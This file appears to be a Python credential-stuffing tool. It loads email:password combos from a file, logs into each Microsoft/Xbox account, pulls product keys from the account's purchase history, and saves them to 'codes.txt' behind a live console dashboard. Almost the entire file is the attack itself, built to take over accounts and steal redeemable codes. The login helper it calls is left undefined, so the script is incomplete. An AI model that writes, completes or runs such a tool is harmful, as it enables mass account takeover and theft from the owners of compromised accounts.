import requests
import os
import time
import threading

# Global variables to track statistics
checked = 0
valid_codes = 0
invalid_codes = 0
accounts = []

# Persistent log to store messages
persistent_log = []

def log_and_print(message):
    """
    Log message to persistent log and print it.
    
    Args:
        message (str): Message to log and print
    """
    global persistent_log
    persistent_log.append(message)
    print(message)

def load_accounts():
    """
    Load accounts from the 'combos.txt' file.
    
    Returns:
    list: A list of account tuples (email, password).
    """
    global accounts
    try:
        with open('combos.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines:
                line = line.strip()
                if ':' in line:  # Ensure the line contains a separator
                    email, password = line.split(':', 1)  # Split only once
                    accounts.append((email, password))
                else:
                    log_and_print(f"Invalid line skipped: {line}")
        log_and_print(f"Loaded {len(accounts)} accounts from combos.txt.")
    except FileNotFoundError:
        log_and_print("Error: 'combos.txt' file not found.")
        return []
    return accounts

def check_purchased_codes(auth_token, email, password):
    log_and_print(f"Checking {email}")
    global valid_codes, invalid_codes
    headers = {
        'Authorization': f'Bearer {auth_token}',
        'Content-Type': 'application/json',
        'x-xbl-contract-version': '2'
    }

    try:
        # Endpoint for purchase history
        url = 'https://purchase.mp.microsoft.com/v7.0/orders/xboxorders'
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        
        orders = response.json()
        codes = []
        
        found_orders = False
        for order in orders.get('orderHistoryItems', []):
            if 'productKey' in order:
                found_orders = True
                code_info = {
                    'product_name': order.get('productTitle', 'Unknown'),
                    'code': order['productKey']
                }
                codes.append(code_info)
                
                # Save the code to the "codes.txt" file
                with open('codes.txt', 'a', encoding='utf-8') as f:
                    f.write(f"Product: {code_info['product_name']}\n")
                    f.write(f"Code: {code_info['code']}\n")
                    f.write("-" * 50 + "\n")
                
                # Display a message for valid codes
                if order['productKey'] != 'invalid or redeemed':
                    log_and_print(f"Found code: {code_info['code']} | valid")
                    valid_codes += 1
                else:
                    log_and_print(f"Found code: {code_info['code']} | invalid")
                    invalid_codes += 1
        
        # If no orders found, log the message
        if not found_orders:
            log_and_print(f"No Orders Found, Checking next account")

    except requests.exceptions.RequestException as e:
        invalid_codes += 1
        log_and_print(f"Error checking purchased codes for {email}: {str(e)}")
        return []

    # Add 1-second delay between account checks
    time.sleep(1)
    return codes

def authenticate(email, password):
    """
    Authenticate with the Microsoft services to get an access token.
    
    Parameters:
    email (str): The email address of the Xbox account to authenticate.
    password (str): The password of the Xbox account to authenticate.
    
    Returns:
    str: The access token for further API calls, or None if authentication fails.
    """
    try:
        # Existing authentication code here...
        auth_token = get_auth_token(email, password)
        return auth_token
    except Exception as e:
        log_and_print(f"Error authenticating {email}: {str(e)}")
        return None

def update_ui():
    """
    Update the UI with the current statistics and persistent log.
    """
    global checked, valid_codes, invalid_codes, persistent_log
    while True:
        os.system('clear')
        print("================================")
        print("         Code Checker Tool")
        print("================================")
        print(f"Accounts Checked: {checked}/{len(accounts)}")
        print(f"Valid Codes: {valid_codes}")
        print(f"Invalid Codes: {invalid_codes}")
        print("\n--- Recent Activity ---")
        # Display last 10 log messages
        for msg in persistent_log[-10:]:
            print(msg)
        print("================================")
        time.sleep(1)

def main():
    global checked, accounts
    
    # Load accounts from combos.txt
    accounts = load_accounts()
    
    # Start the UI update thread
    ui_thread = threading.Thread(target=update_ui)
    ui_thread.daemon = True  # Allow thread to exit when main program ends
    ui_thread.start()
    
    # Check accounts and codes
    for email, password in accounts:
        auth_token = authenticate(email, password)
        if auth_token:
            check_purchased_codes(auth_token, email, password)
        checked += 1
    
    # Optional: Keep the main thread running to maintain UI
    while True:
        time.sleep(1)

if __name__ == "__main__":
    if not os.path.exists('codes.txt'):
        open('codes.txt', 'w').close()
    main()
